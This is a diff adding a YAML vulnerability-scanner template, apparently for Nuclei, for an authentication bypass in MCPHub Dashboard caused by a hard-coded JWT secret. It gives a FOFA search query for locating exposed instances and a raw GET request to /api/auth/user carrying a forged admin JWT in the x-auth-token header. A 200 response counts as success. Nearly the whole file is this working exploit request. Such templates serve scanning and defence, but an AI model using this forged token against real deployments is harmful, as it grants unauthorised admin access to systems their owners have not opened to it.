@@ -1,0 +1,31 @@
+id: poc-ie4wtyz2fcg1zggn
+info:
+  name: MCPHub Dashboard存在JWT硬编码身份认证绕过漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ie4wtyz2fcg1zggn'
+  tags: info-leak,unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ie4wtyz2fcg1zggn
+    fofa: title="MCP Hub Dashboard"
+http:
+- raw:
+  - 'GET /api/auth/user HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Requested-With: XMLHttpRequest
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Priority: u=0
+
+    x-auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlfSwiaWF0IjoxNzU2MjkwNDUxLCJleHAiOjE3NTYzNzY4NTEwMDB9.mCej_jB1U06pG1vA4fc1NG7fS4HhMdG8c0BdJHGQ5sY
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
